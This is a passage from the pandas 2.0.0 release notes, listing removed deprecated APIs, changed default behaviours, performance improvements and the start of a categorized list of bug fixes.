``\"freq\"`` (:issue:`38963`)\n- Removed :attr:`Rolling.is_datetimelike` (:issue:`38963`)\n- Removed the ``level`` keyword in :class:`DataFrame` and :class:`Series` aggregations; use ``groupby`` instead (:issue:`39983`)\n- Removed deprecated :meth:`Timedelta.delta`, :meth:`Timedelta.is_populated`, and :attr:`Timedelta.freq` (:issue:`46430`, :issue:`46476`)\n- Removed deprecated :attr:`NaT.freq` (:issue:`45071`)\n- Removed deprecated :meth:`Categorical.replace`, use :meth:`Series.replace` instead (:issue:`44929`)\n- Removed the ``numeric_only`` keyword from :meth:`Categorical.min` and :meth:`Categorical.max` in favor of ``skipna`` (:issue:`48821`)\n- Changed behavior of :meth:`DataFrame.median` and :meth:`DataFrame.mean` with ``numeric_only=None`` to not exclude datetime-like columns THIS NOTE WILL BE IRRELEVANT ONCE ``numeric_only=None`` DEPRECATION IS ENFORCED (:issue:`29941`)\n- Removed :func:`is_extension_type` in favor of :func:`is_extension_array_dtype` (:issue:`29457`)\n- Removed ``.ExponentialMovingWindow.vol`` (:issue:`39220`)\n- Removed :meth:`Index.get_value` and :meth:`Index.set_value` (:issue:`33907`, :issue:`28621`)\n- Removed :meth:`Series.slice_shift` and :meth:`DataFrame.slice_shift` (:issue:`37601`)\n- Remove :meth:`DataFrameGroupBy.pad` and :meth:`DataFrameGroupBy.backfill` (:issue:`45076`)\n- Remove ``numpy`` argument from :func:`read_json` (:issue:`30636`)\n- Disallow passing abbreviations for ``orient`` in :meth:`DataFrame.to_dict` (:issue:`32516`)\n- Disallow partial slicing on an non-monotonic :class:`DatetimeIndex` with keys which are not in Index. This now raises a ``KeyError`` (:issue:`18531`)\n- Removed ``get_offset`` in favor of :func:`to_offset` (:issue:`30340`)\n- Removed the ``warn`` keyword in :func:`infer_freq` (:issue:`45947`)\n- Removed the ``include_start`` and ``include_end`` arguments in :meth:`DataFrame.between_time` in favor of ``inclusive`` (:issue:`43248`)\n- Removed the ``closed`` argument in :meth:`date_range` and :meth:`bdate_range` in favor of ``inclusive`` argument (:issue:`40245`)\n- Removed the ``center`` keyword in :meth:`DataFrame.expanding` (:issue:`20647`)\n- Removed the ``truediv`` keyword from :func:`eval` (:issue:`29812`)\n- Removed the ``method`` and ``tolerance`` arguments in :meth:`Index.get_loc`. Use ``index.get_indexer([label], method=..., tolerance=...)`` instead (:issue:`42269`)\n- Removed the ``pandas.datetime`` submodule (:issue:`30489`)\n- Removed the ``pandas.np`` submodule (:issue:`30296`)\n- Removed ``pandas.util.testing`` in favor of ``pandas.testing`` (:issue:`30745`)\n- Removed :meth:`Series.str.__iter__` (:issue:`28277`)\n- Removed ``pandas.SparseArray`` in favor of :class:`arrays.SparseArray` (:issue:`30642`)\n- Removed ``pandas.SparseSeries`` and ``pandas.SparseDataFrame``, including pickle support. (:issue:`30642`)\n- Enforced disallowing passing an integer ``fill_value`` to :meth:`DataFrame.shift` and :meth:`Series.shift`` with datetime64, timedelta64, or period dtypes (:issue:`32591`)\n- Enforced disallowing a string column label into ``times`` in :meth:`DataFrame.ewm` (:issue:`43265`)\n- Enforced disallowing passing ``True`` and ``False`` into ``inclusive`` in :meth:`Series.between` in favor of ``\"both\"`` and ``\"neither\"`` respectively (:issue:`40628`)\n- Enforced disallowing using ``usecols`` with out of bounds indices for ``read_csv`` with ``engine=\"c\"`` (:issue:`25623`)\n- Enforced disallowing the use of ``**kwargs`` in :class:`.ExcelWriter`; use the keyword argument ``engine_kwargs`` instead (:issue:`40430`)\n- Enforced disallowing a tuple of column labels into :meth:`.DataFrameGroupBy.__getitem__` (:issue:`30546`)\n- Enforced disallowing missing labels when indexing with a sequence of labels on a level of a :class:`MultiIndex`. This now raises a ``KeyError`` (:issue:`42351`)\n- Enforced disallowing setting values with ``.loc`` using a positional slice. Use ``.loc`` with labels or ``.iloc`` with positions instead (:issue:`31840`)\n- Enforced disallowing positional indexing with a ``float`` key even if that key is a round number, manually cast to integer instead (:issue:`34193`)\n- Enforced disallowing using a :class:`DataFrame` indexer with ``.iloc``, use ``.loc`` instead for automatic alignment (:issue:`39022`)\n- Enforced disallowing ``set`` or ``dict`` indexers in ``__getitem__`` and ``__setitem__`` methods (:issue:`42825`)\n- Enforced disallowing indexing on a :class:`Index` or positional indexing on a :class:`Series` producing multi-dimensional objects e.g. ``obj[:, None]``, convert to numpy before indexing instead (:issue:`35141`)\n- Enforced disallowing ``dict`` or ``set`` objects in ``suffixes`` in :func:`merge` (:issue:`34810`)\n- Enforced disallowing :func:`merge` to produce duplicated columns through the ``suffixes`` keyword and already existing columns (:issue:`22818`)\n- Enforced disallowing using :func:`merge` or :func:`join` on a different number of levels (:issue:`34862`)\n- Enforced disallowing ``value_name`` argument in :func:`DataFrame.melt` to match an element in the :class:`DataFrame` columns (:issue:`35003`)\n- Enforced disallowing passing ``showindex`` into ``**kwargs`` in :func:`DataFrame.to_markdown` and :func:`Series.to_markdown` in favor of ``index`` (:issue:`33091`)\n- Removed setting Categorical._codes directly (:issue:`41429`)\n- Removed setting Categorical.categories directly (:issue:`47834`)\n- Removed argument ``inplace`` from :meth:`Categorical.add_categories`, :meth:`Categorical.remove_categories`, :meth:`Categorical.set_categories`, :meth:`Categorical.rename_categories`, :meth:`Categorical.reorder_categories`, :meth:`Categorical.set_ordered`, :meth:`Categorical.as_ordered`, :meth:`Categorical.as_unordered` (:issue:`37981`, :issue:`41118`, :issue:`41133`, :issue:`47834`)\n- Enforced :meth:`Rolling.count` with ``min_periods=None`` to default to the size of the window (:issue:`31302`)\n- Renamed ``fname`` to ``path`` in :meth:`DataFrame.to_parquet`, :meth:`DataFrame.to_stata` and :meth:`DataFrame.to_feather` (:issue:`30338`)\n- Enforced disallowing indexing a :class:`Series` with a single item list with a slice (e.g. ``ser[[slice(0, 2)]]``). Either convert the list to tuple, or pass the slice directly instead (:issue:`31333`)\n- Changed behavior indexing on a :class:`DataFrame` with a :class:`DatetimeIndex` index using a string indexer, previously this operated as a slice on rows, now it operates like any other column key; use ``frame.loc[key]`` for the old behavior (:issue:`36179`)\n- Enforced the ``display.max_colwidth`` option to not accept negative integers (:issue:`31569`)\n- Removed the ``display.column_space`` option in favor of ``df.to_string(col_space=...)`` (:issue:`47280`)\n- Removed the deprecated method ``mad`` from pandas classes (:issue:`11787`)\n- Removed the deprecated method ``tshift`` from pandas classes (:issue:`11631`)\n- Changed behavior of empty data passed into :class:`Series`; the default dtype will be ``object`` instead of ``float64`` (:issue:`29405`)\n- Changed the behavior of :meth:`DatetimeIndex.union`, :meth:`DatetimeIndex.intersection`, and :meth:`DatetimeIndex.symmetric_difference` with mismatched timezones to convert to UTC instead of casting to object dtype (:issue:`39328`)\n- Changed the behavior of :func:`to_datetime` with argument \"now\" with ``utc=False`` to match ``Timestamp(\"now\")`` (:issue:`18705`)\n- Changed the behavior of indexing on a timezone-aware :class:`DatetimeIndex` with a timezone-naive ``datetime`` object or vice-versa; these now behave like any other non-comparable type by raising ``KeyError`` (:issue:`36148`)\n- Changed the behavior of :meth:`Index.reindex`, :meth:`Series.reindex`, and :meth:`DataFrame.reindex` with a ``datetime64`` dtype and a ``datetime.date`` object for ``fill_value``; these are no longer considered equivalent to ``datetime.datetime`` objects so the reindex casts to object dtype (:issue:`39767`)\n- Changed behavior of :meth:`SparseArray.astype` when given a dtype that is not explicitly ``SparseDtype``, cast to the exact requested dtype rather than silently using a ``SparseDtype`` instead (:issue:`34457`)\n- Changed behavior of :meth:`Index.ravel` to return a view on the original :class:`Index` instead of a ``np.ndarray`` (:issue:`36900`)\n- Changed behavior of :meth:`Series.to_frame` and :meth:`Index.to_frame` with explicit ``name=None`` to use ``None`` for the column name instead of the index's name or default ``0`` (:issue:`45523`)\n- Changed behavior of :func:`concat` with one array of ``bool``-dtype and another of integer dtype, this now returns ``object`` dtype instead of integer dtype; explicitly cast the bool object to integer before concatenating to get the old behavior (:issue:`45101`)\n- Changed behavior of :class:`DataFrame` constructor given floating-point ``data`` and an integer ``dtype``, when the data cannot be cast losslessly, the floating point dtype is retained, matching :class:`Series` behavior (:issue:`41170`)\n- Changed behavior of :class:`Index` constructor when given a ``np.ndarray`` with object-dtype containing numeric entries; this now retains object dtype rather than inferring a numeric dtype, consistent with :class:`Series` behavior (:issue:`42870`)\n- Changed behavior of :meth:`Index.__and__`, :meth:`Index.__or__` and :meth:`Index.__xor__` to behave as logical operations (matching :class:`Series` behavior) instead of aliases for set operations (:issue:`37374`)\n- Changed behavior of :class:`DataFrame` constructor when passed a list whose first element is a :class:`Categorical`, this now treats the elements as rows casting to ``object`` dtype, consistent with behavior for other types (:issue:`38845`)\n- Changed behavior of :class:`DataFrame` constructor when passed a ``dtype`` (other than int) that the data cannot be cast to; it now raises instead of silently ignoring the dtype (:issue:`41733`)\n- Changed the behavior of :class:`Series` constructor, it will no longer infer a datetime64 or timedelta64 dtype from string entries (:issue:`41731`)\n- Changed behavior of :class:`Timestamp` constructor with a ``np.datetime64`` object and a ``tz`` passed to interpret the input as a wall-time as opposed to a UTC time (:issue:`42288`)\n- Changed behavior of :meth:`Timestamp.utcfromtimestamp` to return a timezone-aware object satisfying ``Timestamp.utcfromtimestamp(val).timestamp() == val`` (:issue:`45083`)\n- Changed behavior of :class:`Index` constructor when passed a ``SparseArray`` or ``SparseDtype`` to retain that dtype instead of casting to ``numpy.ndarray`` (:issue:`43930`)\n- Changed behavior of setitem-like operations (``__setitem__``, ``fillna``, ``where``, ``mask``, ``replace``, ``insert``, fill_value for ``shift``) on an object with :class:`DatetimeTZDtype` when using a value with a non-matching timezone, the value will be cast to the object's timezone instead of casting both to object-dtype (:issue:`44243`)\n- Changed behavior of :class:`Index`, :class:`Series`, :class:`DataFrame` constructors with floating-dtype data and a :class:`DatetimeTZDtype`, the data are now interpreted as UTC-times instead of wall-times, consistent with how integer-dtype data are treated (:issue:`45573`)\n- Changed behavior of :class:`Series` and :class:`DataFrame` constructors with integer dtype and floating-point data containing ``NaN``, this now raises ``IntCastingNaNError`` (:issue:`40110`)\n- Changed behavior of :class:`Series` and :class:`DataFrame` constructors with an integer ``dtype`` and values that are too large to losslessly cast to this dtype, this now raises ``ValueError`` (:issue:`41734`)\n- Changed behavior of :class:`Series` and :class:`DataFrame` constructors with an integer ``dtype`` and values having either ``datetime64`` or ``timedelta64`` dtypes, this now raises ``TypeError``, use ``values.view(\"int64\")`` instead (:issue:`41770`)\n- Removed the deprecated ``base`` and ``loffset`` arguments from :meth:`pandas.DataFrame.resample`, :meth:`pandas.Series.resample` and :class:`pandas.Grouper`. Use ``offset`` or ``origin`` instead (:issue:`31809`)\n- Changed behavior of :meth:`Series.fillna` and :meth:`DataFrame.fillna` with ``timedelta64[ns]`` dtype and an incompatible ``fill_value``; this now casts to ``object`` dtype instead of raising, consistent with the behavior with other dtypes (:issue:`45746`)\n- Change the default argument of ``regex`` for :meth:`Series.str.replace` from ``True`` to ``False``. Additionally, a single character ``pat`` with ``regex=True`` is now treated as a regular expression instead of a string literal. (:issue:`36695`, :issue:`24804`)\n- Changed behavior of :meth:`DataFrame.any` and :meth:`DataFrame.all` with ``bool_only=True``; object-dtype columns with all-bool values will no longer be included, manually cast to ``bool`` dtype first (:issue:`46188`)\n- Changed behavior of :meth:`DataFrame.max`, :class:`DataFrame.min`, :class:`DataFrame.mean`, :class:`DataFrame.median`, :class:`DataFrame.skew`, :class:`DataFrame.kurt` with ``axis=None`` to return a scalar applying the aggregation across both axes (:issue:`45072`)\n- Changed behavior of comparison of a :class:`Timestamp` with a ``datetime.date`` object; these now compare as un-equal and raise on inequality comparisons, matching the ``datetime.datetime`` behavior (:issue:`36131`)\n- Changed behavior of comparison of ``NaT`` with a ``datetime.date`` object; these now raise on inequality comparisons (:issue:`39196`)\n- Enforced deprecation of silently dropping columns that raised a ``TypeError`` in :class:`Series.transform` and :class:`DataFrame.transform` when used with a list or dictionary (:issue:`43740`)\n- Changed behavior of :meth:`DataFrame.apply` with list-like so that any partial failure will raise an error (:issue:`43740`)\n- Changed behaviour of :meth:`DataFrame.to_latex` to now use the Styler implementation via :meth:`.Styler.to_latex` (:issue:`47970`)\n- Changed behavior of :meth:`Series.__setitem__` with an integer key and a :class:`Float64Index` when the key is not present in the index; previously we treated the key as positional (behaving like ``series.iloc[key] = val``), now we treat it is a label (behaving like ``series.loc[key] = val``), consistent with :meth:`Series.__getitem__`` behavior (:issue:`33469`)\n- Removed ``na_sentinel`` argument from :func:`factorize`, :meth:`.Index.factorize`, and :meth:`.ExtensionArray.factorize` (:issue:`47157`)\n- Changed behavior of :meth:`Series.diff` and :meth:`DataFrame.diff` with :class:`ExtensionDtype` dtypes whose arrays do not implement ``diff``, these now raise ``TypeError`` rather than casting to numpy (:issue:`31025`)\n- Enforced deprecation of calling numpy \"ufunc\"s on :class:`DataFrame` with ``method=\"outer\"``; this now raises ``NotImplementedError`` (:issue:`36955`)\n- Enforced deprecation disallowing passing ``numeric_only=True`` to :class:`Series` reductions (``rank``, ``any``, ``all``, ...) with non-numeric dtype (:issue:`47500`)\n- Changed behavior of :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` so that ``group_keys`` is respected even if a transformer is detected (:issue:`34998`)\n- Comparisons between a :class:`DataFrame` and a :class:`Series` where the frame's columns do not match the series's index raise ``ValueError`` instead of automatically aligning, do ``left, right = left.align(right, axis=1, copy=False)`` before comparing (:issue:`36795`)\n- Enforced deprecation ``numeric_only=None`` (the default) in DataFrame reductions that would silently drop columns that raised; ``numeric_only`` now defaults to ``False`` (:issue:`41480`)\n- Changed default of ``numeric_only`` to ``False`` in all DataFrame methods with that argument (:issue:`46096`, :issue:`46906`)\n- Changed default of ``numeric_only`` to ``False`` in :meth:`Series.rank` (:issue:`47561`)\n- Enforced deprecation of silently dropping nuisance columns in groupby and resample operations when ``numeric_only=False`` (:issue:`41475`)\n- Enforced deprecation of silently dropping nuisance columns in :class:`Rolling`, :class:`Expanding`, and :class:`ExponentialMovingWindow` ops. This will now raise a :class:`.errors.DataError` (:issue:`42834`)\n- Changed behavior in setting values with ``df.loc[:, foo] = bar`` or ``df.iloc[:, foo] = bar``, these now always attempt to set values inplace before falling back to casting (:issue:`45333`)\n- Changed default of ``numeric_only`` in various :class:`.DataFrameGroupBy` methods; all methods now default to ``numeric_only=False`` (:issue:`46072`)\n- Changed default of ``numeric_only`` to ``False`` in :class:`.Resampler` methods (:issue:`47177`)\n- Using the method :meth:`.DataFrameGroupBy.transform` with a callable that returns DataFrames will align to the input's index (:issue:`47244`)\n- When providing a list of columns of length one to :meth:`DataFrame.groupby`, the keys that are returned by iterating over the resulting :class:`DataFrameGroupBy` object will now be tuples of length one (:issue:`47761`)\n- Removed deprecated methods :meth:`ExcelWriter.write_cells`, :meth:`ExcelWriter.save`, :meth:`ExcelWriter.cur_sheet`, :meth:`ExcelWriter.handles`, :meth:`ExcelWriter.path` (:issue:`45795`)\n- The :class:`ExcelWriter` attribute ``book`` can no longer be set; it is still available to be accessed and mutated (:issue:`48943`)\n- Removed unused ``*args`` and ``**kwargs`` in :class:`Rolling`, :class:`Expanding`, and :class:`ExponentialMovingWindow` ops (:issue:`47851`)\n- Removed the deprecated argument ``line_terminator`` from :meth:`DataFrame.to_csv` (:issue:`45302`)\n- Removed the deprecated argument ``label`` from :func:`lreshape` (:issue:`30219`)\n- Arguments after ``expr`` in :meth:`DataFrame.eval` and :meth:`DataFrame.query` are keyword-only (:issue:`47587`)\n- Removed :meth:`Index._get_attributes_dict` (:issue:`50648`)\n- Removed :meth:`Series.__array_wrap__` (:issue:`50648`)\n- Changed behavior of :meth:`.DataFrame.value_counts` to return a :class:`Series` with :class:`MultiIndex` for any list-like(one element or not) but an :class:`Index` for a single label (:issue:`50829`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :meth:`.DataFrameGroupBy.median` and :meth:`.SeriesGroupBy.median` and :meth:`.DataFrameGroupBy.cumprod` for nullable dtypes (:issue:`37493`)\n- Performance improvement in :meth:`.DataFrameGroupBy.all`, :meth:`.DataFrameGroupBy.any`, :meth:`.SeriesGroupBy.all`, and :meth:`.SeriesGroupBy.any` for object dtype (:issue:`50623`)\n- Performance improvement in :meth:`MultiIndex.argsort` and :meth:`MultiIndex.sort_values` (:issue:`48406`)\n- Performance improvement in :meth:`MultiIndex.size` (:issue:`48723`)\n- Performance improvement in :meth:`MultiIndex.union` without missing values and without duplicates (:issue:`48505`, :issue:`48752`)\n- Performance improvement in :meth:`MultiIndex.difference` (:issue:`48606`)\n- Performance improvement in :class:`MultiIndex` set operations with sort=None (:issue:`49010`)\n- Performance improvement in :meth:`.DataFrameGroupBy.mean`, :meth:`.SeriesGroupBy.mean`, :meth:`.DataFrameGroupBy.var`, and :meth:`.SeriesGroupBy.var` for extension array dtypes (:issue:`37493`)\n- Performance improvement in :meth:`MultiIndex.isin` when ``level=None`` (:issue:`48622`, :issue:`49577`)\n- Performance improvement in :meth:`MultiIndex.putmask` (:issue:`49830`)\n- Performance improvement in :meth:`Index.union` and :meth:`MultiIndex.union` when index contains duplicates (:issue:`48900`)\n- Performance improvement in :meth:`Series.rank` for pyarrow-backed dtypes (:issue:`50264`)\n- Performance improvement in :meth:`Series.searchsorted` for pyarrow-backed dtypes (:issue:`50447`)\n- Performance improvement in :meth:`Series.fillna` for extension array dtypes (:issue:`49722`, :issue:`50078`)\n- Performance improvement in :meth:`Index.join`, :meth:`Index.intersection` and :meth:`Index.union` for masked and arrow dtypes when :class:`Index` is monotonic (:issue:`50310`, :issue:`51365`)\n- Performance improvement for :meth:`Series.value_counts` with nullable dtype (:issue:`48338`)\n- Performance improvement for :class:`Series` constructor passing integer numpy array with nullable dtype (:issue:`48338`)\n- Performance improvement for :class:`DatetimeIndex` constructor passing a list (:issue:`48609`)\n- Performance improvement in :func:`merge` and :meth:`DataFrame.join` when joining on a sorted :class:`MultiIndex` (:issue:`48504`)\n- Performance improvement in :func:`to_datetime` when parsing strings with timezone offsets (:issue:`50107`)\n- Performance improvement in :meth:`DataFrame.loc` and :meth:`Series.loc` for tuple-based indexing of a :class:`MultiIndex` (:issue:`48384`)\n- Performance improvement for :meth:`Series.replace` with categorical dtype (:issue:`49404`)\n- Performance improvement for :meth:`MultiIndex.unique` (:issue:`48335`)\n- Performance improvement for indexing operations with nullable and arrow dtypes (:issue:`49420`, :issue:`51316`)\n- Performance improvement for :func:`concat` with extension array backed indexes (:issue:`49128`, :issue:`49178`)\n- Performance improvement for :func:`api.types.infer_dtype` (:issue:`51054`)\n- Reduce memory usage of :meth:`DataFrame.to_pickle`/:meth:`Series.to_pickle` when using BZ2 or LZMA (:issue:`49068`)\n- Performance improvement for :class:`~arrays.StringArray` constructor passing a numpy array with type ``np.str_`` (:issue:`49109`)\n- Performance improvement in :meth:`~arrays.IntervalArray.from_tuples` (:issue:`50620`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.factorize` (:issue:`49177`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.__setitem__` (:issue:`50248`, :issue:`50632`)\n- Performance improvement in :class:`~arrays.ArrowExtensionArray` comparison methods when array contains NA (:issue:`50524`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.to_numpy` (:issue:`49973`, :issue:`51227`)\n- Performance improvement when parsing strings to :class:`BooleanDtype` (:issue:`50613`)\n- Performance improvement in :meth:`DataFrame.join` when joining on a subset of a :class:`MultiIndex` (:issue:`48611`)\n- Performance improvement for :meth:`MultiIndex.intersection` (:issue:`48604`)\n- Performance improvement in :meth:`DataFrame.__setitem__` (:issue:`46267`)\n- Performance improvement in ``var`` and ``std`` for nullable dtypes (:issue:`48379`).\n- Performance improvement when iterating over pyarrow and nullable dtypes (:issue:`49825`, :issue:`49851`)\n- Performance improvements to :func:`read_sas` (:issue:`47403`, :issue:`47405`, :issue:`47656`, :issue:`48502`)\n- Memory improvement in :meth:`RangeIndex.sort_values` (:issue:`48801`)\n- Performance improvement in :meth:`Series.to_numpy` if ``copy=True`` by avoiding copying twice (:issue:`24345`)\n- Performance improvement in :meth:`Series.rename` with :class:`MultiIndex` (:issue:`21055`)\n- Performance improvement in :class:`DataFrameGroupBy` and :class:`SeriesGroupBy` when ``by`` is a categorical type and ``sort=False`` (:issue:`48976`)\n- Performance improvement in :class:`DataFrameGroupBy` and :class:`SeriesGroupBy` when ``by`` is a categorical type and ``observed=False`` (:issue:`49596`)\n- Performance improvement in :func:`read_stata` with parameter ``index_col`` set to ``None`` (the default). Now the index will be a :class:`RangeIndex` instead of :class:`Int64Index` (:issue:`49745`)\n- Performance improvement in :func:`merge` when not merging on the index - the new index will now be :class:`RangeIndex` instead of :class:`Int64Index` (:issue:`49478`)\n- Performance improvement in :meth:`DataFrame.to_dict` and :meth:`Series.to_dict` when using any non-object dtypes (:issue:`46470`)\n- Performance improvement in :func:`read_html` when there are multiple tables (:issue:`49929`)\n- Performance improvement in :class:`Period` constructor when constructing from a string or integer (:issue:`38312`)\n- Performance improvement in :func:`to_datetime` when using ``'%Y%m%d'`` format (:issue:`17410`)\n- Performance improvement in :func:`to_datetime` when format is given or can be inferred (:issue:`50465`)\n- Performance improvement in :meth:`Series.median` for nullable dtypes (:issue:`50838`)\n- Performance improvement in :func:`read_csv` when passing :func:`to_datetime` lambda-function to ``date_parser`` and inputs have mixed timezone offsetes (:issue:`35296`)\n- Performance improvement in :func:`isna` and :func:`isnull` (:issue:`50658`)\n- Performance improvement in :meth:`.SeriesGroupBy.value_counts` with categorical dtype (:issue:`46202`)\n- Fixed a reference leak in :func:`read_hdf` (:issue:`37441`)\n- Fixed a memory leak in :meth:`DataFrame.to_json` and :meth:`Series.to_json` when serializing datetimes and timedeltas (:issue:`40443`)\n- Decreased memory usage in many :class:`DataFrameGroupBy` methods (:issue:`51090`)\n- Performance improvement in :meth:`DataFrame.round` for an integer ``decimal`` parameter (:issue:`17254`)\n- Performance improvement in :meth:`DataFrame.replace` and :meth:`Series.replace` when using a large dict for ``to_replace`` (:issue:`6697`)\n- Memory improvement in :class:`StataReader` when reading seekable files (:issue:`48922`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- Bug in :meth:`Categorical.set_categories` losing dtype information (:issue:`48812`)\n- Bug in :meth:`Series.replace` with categorical dtype when ``to_replace`` values overlap with new values (:issue:`49404`)\n- Bug in :meth:`Series.replace` with categorical dtype losing nullable dtypes of underlying categories (:issue:`49404`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` would reorder categories when used as a grouper (:issue:`48749`)\n- Bug in :class:`Categorical` constructor when constructing from a :class:`Categorical` object and ``dtype=\"category\"`` losing ordered-ness (:issue:`49309`)\n- Bug in :meth:`.SeriesGroupBy.min`, :meth:`.SeriesGroupBy.max`, :meth:`.DataFrameGroupBy.min`, and :meth:`.DataFrameGroupBy.max` with unordered :class:`CategoricalDtype` with no groups failing to raise ``TypeError`` (:issue:`51034`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :func:`pandas.infer_freq`, raising ``TypeError`` when inferred on :class:`RangeIndex` (:issue:`47084`)\n- Bug in :func:`to_datetime` incorrectly raising ``OverflowError`` with string arguments corresponding to large integers (:issue:`50533`)\n- Bug in :func:`to_datetime` was raising on invalid offsets with ``errors='coerce'`` and ``infer_datetime_format=True`` (:issue:`48633`)\n- Bug in :class:`DatetimeIndex` constructor failing to raise when ``tz=None`` is explicitly specified in conjunction with timezone-aware ``dtype`` or data (:issue:`48659`)\n- Bug in subtracting a ``datetime`` scalar from :class:`DatetimeIndex` failing to retain the original ``freq`` attribute (:issue:`48818`)\n- Bug in ``pandas.tseries.holiday.Holiday`` where a half-open date interval causes inconsistent return types from :meth:`USFederalHolidayCalendar.holidays` (:issue:`49075`)\n- Bug in rendering :class:`DatetimeIndex` and :class:`Series` and :class:`DataFrame` with timezone-aware dtypes with ``dateutil`` or ``zoneinfo`` timezones near daylight-savings transitions (:issue:`49684`)\n- Bug in :func:`to_datetime` was raising ``ValueError`` when parsing :class:`Timestamp`, ``datetime.datetime``, ``datetime.date``, or ``np.datetime64`` objects when non-ISO8601 ``format`` was passed (:issue:`49298`, :issue:`50036`)\n- Bug in :func:`to_datetime` was raising ``ValueError`` when parsing empty string and non-ISO8601 format was passed. Now, empty strings will be parsed as :class:`NaT`, for compatibility with how is done for ISO8601 formats (:issue:`50251`)\n- Bug in :class:`Timestamp` was showing ``UserWarning``, which was not actionable by users, when parsing non-ISO8601 delimited date strings (:issue:`50232`)\n- Bug in :func:`to_datetime` was showing misleading ``ValueError`` when parsing dates with format containing ISO week directive and ISO weekday directive (:issue:`50308`)\n- Bug in :meth:`Timestamp.round` when the ``freq`` argument has zero-duration (e.g. \"0ns\") returning incorrect results instead of raising (:issue:`49737`)\n- Bug in :func:`to_datetime` was not raising ``ValueError`` when invalid format was passed and ``errors`` was ``'ignore'`` or ``'coerce'`` (:issue:`50266`)\n- Bug in :class:`DateOffset` was throwing ``TypeError`` when constructing with milliseconds and another super-daily argument (:issue:`49897`)\n- Bug in :func:`to_datetime` was not raising ``ValueError`` when parsing string with decimal date with format ``'%Y%m%d'`` (:issue:`50051`)\n- Bug in :func:`to_datetime` was not converting ``None`` to ``NaT`` when parsing mixed-offset date strings with ISO8601 format (:issue:`50071`)\n- Bug in :func:`to_datetime` was not returning input when parsing out-of-bounds date string with ``errors='ignore'`` and ``format='%Y%m%d'`` (:issue:`14487`)\n- Bug in :func:`to_datetime` was converting timezone-naive ``datetime.datetime`` to timezone-aware when parsing with timezone-aware strings, ISO8601 format, and ``utc=False`` (:issue:`50254`)\n- Bug in :func:`to_datetime` was throwing ``ValueError`` when parsing dates with ISO8601 format where some values were not zero-padded (:issue:`21422`)\n- Bug in :func:`to_datetime` was giving incorrect results when using ``format='%Y%m%d'`` and ``errors='ignore'`` (:issue:`26493`)\n- Bug in :func:`to_datetime` was failing to parse date strings ``'today'`` and ``'now'`` if ``format`` was not ISO8601 (:issue:`50359`)\n- Bug in :func:`Timestamp.utctimetuple` raising a ``TypeError`` (:issue:`32174`)\n- Bug in :func:`to_datetime` was raising ``ValueError`` when parsing mixed-offset :class:`Timestamp` with ``errors='ignore'`` (:issue:`50585`)\n- Bug in :func:`to_datetime` was incorrectly handling floating-point inputs within 1 ``unit`` of the overflow boundaries (:issue:`50183`)\n- Bug in :func:`to_datetime` with unit of \"Y\" or \"M\" giving incorrect results, not matching pointwise :class:`Timestamp` results (:issue:`50870`)\n- Bug in :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` with datetime or timedelta dtypes incorrectly raising ``ValueError`` (:issue:`11312`)\n- Bug in :func:`to_datetime` was not returning input with ``errors='ignore'`` when input was out-of-bounds (:issue:`50587`)\n- Bug in :func:`DataFrame.from_records` when given a :class:`DataFrame` input with timezone-aware datetime64 columns incorrectly dropping the timezone-awareness (:issue:`51162`)\n- Bug in :func:`to_datetime` was raising ``decimal.InvalidOperation`` when parsing date strings with ``errors='coerce'`` (:issue:`51084`)\n- Bug in :func:`to_datetime` with both ``unit`` and ``origin`` specified returning incorrect results (:issue:`42624`)\n- Bug in :meth:`Series.astype` and :meth:`DataFrame.astype` when converting an object-dtype object containing timezone-aware datetimes or strings to ``datetime64[ns]`` incorrectly localizing as UTC instead of raising ``TypeError`` (:issue:`50140`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` with datetime or timedelta dtypes giving incorrect results for groups containing ``NaT`` (:issue:`51373`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` incorrectly raising with :class:`PeriodDtype` or :class:`DatetimeTZDtype` (:issue:`51373`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :func:`to_timedelta` raising error when input has nullable dtype ``Float64`` (:issue:`48796`)\n- Bug in :class:`Timedelta` constructor incorrectly raising instead of returning ``NaT`` when given a ``np.timedelta64(\"nat\")`` (:issue:`48898`)\n- Bug in :class:`Timedelta` constructor failing to raise when passed both a :class:`Timedelta` object and keywords (e.g. days, seconds) (:issue:`48898`)\n- Bug in :class:`Timedelta` comparisons with very large ``datetime.timedelta`` objects incorrect raising ``OutOfBoundsTimedelta`` (:issue:`49021`)\n\nTimezones\n^^^^^^^^^\n- Bug in :meth:`Series.astype` and :meth:`DataFrame.astype` with object-dtype containing multiple timezone-aware ``datetime`` objects with heterogeneous timezones to a :class:`DatetimeTZDtype` incorrectly raising (:issue:`32581`)\n- Bug in :func:`to_datetime` was failing to parse date strings with timezone name when ``format`` was specified with ``%Z`` (:issue:`49748`)\n- Better error message when passing invalid values to ``ambiguous`` parameter in :meth:`Timestamp.tz_localize` (:issue:`49565`)\n- Bug in string parsing incorrectly allowing a :class:`Timestamp` to be constructed with an invalid timezone, which would raise when trying to print (:issue:`50668`)\n- Corrected TypeError message in :func:`objects_to_datetime64ns` to inform that DatetimeIndex has mixed timezones (:issue:`50974`)\n\nNumeric\n^^^^^^^\n- Bug in :meth:`DataFrame.add` cannot apply ufunc when inputs contain mixed DataFrame type and Series type (:issue:`39853`)\n- Bug in arithmetic operations on :class:`Series` not propagating mask when combining masked dtypes and numpy dtypes (:issue:`45810`, :issue:`42630`)\n- Bug in :meth:`DataFrame.sem` and :meth:`Series.sem` where an erroneous ``TypeError`` would always raise when using data backed by an :class:`ArrowDtype` (:issue:`49759`)\n- Bug in :meth:`Series.__add__` casting to object for list and masked :class:`Series` (:issue:`22962`)\n- Bug in :meth:`~arrays.ArrowExtensionArray.mode` where ``dropna=False`` was not respected when there was ``NA`` values 